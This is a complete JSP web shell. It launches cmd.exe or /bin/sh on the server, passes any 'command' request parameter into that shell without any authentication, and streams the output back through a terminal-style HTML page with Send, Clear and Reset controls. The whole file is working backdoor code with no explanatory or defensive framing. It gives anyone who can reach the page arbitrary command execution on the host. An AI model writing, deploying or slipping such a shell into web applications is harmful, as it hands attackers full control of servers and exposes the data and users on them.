<%@	page import="java.io.*" %>
<%!
	private static String OS = n(System.getProperty("os.name"));
	private static String newLine = n(System.getProperty("line.separator"));
	private static boolean win = OS.toLowerCase().startsWith("win");
	private static String auto = win?"cmd.exe":"/bin/sh";
	private static Process process;
	private static InputStreamReader input;
	private static InputStreamReader error;
	private static OutputStreamWriter output;
	private static ProcessReader inputReader;
	private static ProcessReader errorReader;
	
	private static void initShell(PrintWriter writer){
		if(process != null)return;
		try{
			process = Runtime.getRuntime().exec(auto);
			input = new InputStreamReader(process.getInputStream());
			error = new InputStreamReader(process.getErrorStream());
			output = new OutputStreamWriter(process.getOutputStream());
			inputReader = new ProcessReader(input);
			errorReader = new ProcessReader(error);
			new Thread(inputReader).start();
			new Thread(errorReader).start();
		}catch(Exception e){
			e.printStackTrace(writer);
		}
	}
	
	private static void resetShell(PrintWriter writer, String cmd){
		try{
			output.close();
			inputReader.exit = true;
			errorReader.exit = true;
			process.destroy();
			ProcessReader.buffer = "";
			process = Runtime.getRuntime().exec(e(cmd)?auto:cmd);
			input = new InputStreamReader(process.getInputStream());
			error = new InputStreamReader(process.getErrorStream());
			output = new OutputStreamWriter(process.getOutputStream());
			inputReader = new ProcessReader(input);
			errorReader = new ProcessReader(error);
			new Thread(inputReader).start();
			new Thread(errorReader).start();
		}catch(Exception e){
			e.printStackTrace(writer);
		}
	}

	private static boolean e(Object input){
		return (input==null||input.equals(""))?true:false;
	}
	
	private static String n(Object input){
		return input==null?"":(String)input;
	}
	
	private static String h(Object input){
		if(e(input))return "";
		return ((String)input).replaceAll("&", "&amp;").replaceAll("\"", "&quot;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll("'", "&#39;");
	}
	
	private static String read(){
		return ProcessReader.buffer;
	}
	
	private static void write(String command){
		try{
			output.write(command);
			output.flush();
		}catch(Exception e){}
	}
	
	private static void writeWithEnter(String command){
		write(command + newLine);
	}
	
	private static class ProcessReader implements Runnable{
		public boolean exit = false;
		private InputStreamReader input;
		public static String buffer = "";
		
		public ProcessReader(InputStreamReader in){
			this.input = in;
		}
		
		public void run(){
			try{
				int b = 0;
				while((b = input.read()) != -1){
					if(this.exit)return;
					ProcessReader.buffer += String.valueOf((char)b);
				}
			}catch(Exception e){
				ProcessReader.buffer = e.getMessage();
			}
		}
	}
%>
<%@ page contentType="text/html; charset=utf-8" %>
<%	initShell(response.getWriter());
	if("true".equals(request.getParameter("read"))){
		response.getWriter().println("<html><body onload='setTimeout(function(){window.location.reload();},2000);'><pre id='output'>");
		response.getWriter().println(h(read()));
		response.getWriter().println("</pre></body><script>window.parent.refreshOutput(document.getElementById('output').innerText);</script></html>");
		return;
	}
	if("true".equals(request.getParameter("execute"))){
		boolean noEnter = "true".equals(request.getParameter("noEnter"))?true:false;
		boolean Reset = "true".equals(request.getParameter("Reset"))?true:false;
		boolean Clear = "true".equals(request.getParameter("Clear"))?true:false;
		String command = n(request.getParameter("command"));
		if(Reset){
			resetShell(response.getWriter(), null);
		}else if(Clear){
			ProcessReader.buffer = "";
		}else if(noEnter){
			write(command);
		}else{
			writeWithEnter(command);
		}
	}
	String reset = n(request.getParameter("reset"));
	if(!e(reset)){
		if("auto".equals(reset)){
			resetShell(response.getWriter(), null);
		}else{
			resetShell(response.getWriter(), reset);
		}
	}
%>
<html>
<head>
<title><%=OS %></title>
</head>
<script>
	function refreshOutput(value){
		document.getElementById('output').innerText = value;
	}
</script>
<body>
<div style="border:1px solid black;padding:1em;">
</div>
<br/>
<div style="padding:1em;background:black;color:lime;">
<pre id="output">
</pre>
</div>
<iframe style="display:none;" src="<%=request.getRequestURI() %>?read=true" ></iframe>
<form action="<%=request.getRequestURI() %>#bottom" method="Post" style="border:1px solid black;padding:1em;">
	<input type="hidden" name="execute" value="true" />
	<input type="hidden" id="noEnter" name="noEnter" />
	<input type="hidden" id="Reset" name="Reset" />
	<input type="hidden" id="Clear" name="Clear" />
	<input type="text" id="command" name="command" style="width:100%" />
	<input type="submit" value="Send + Enter" />
	<input type="button" value="Send" onClick="document.getElementById('noEnter').value='true';form.submit();" />
	<input type="button" value="Clear" onClick="document.getElementById('Clear').value='true';form.submit();" />
	<input type="button" value="Reset" onClick="document.getElementById('Reset').value='true';form.submit();" />
</form>
<a name="bottom" />
</body>
<script>
	setTimeout(function(){document.getElementById('command').focus();},200);
</script>
</html>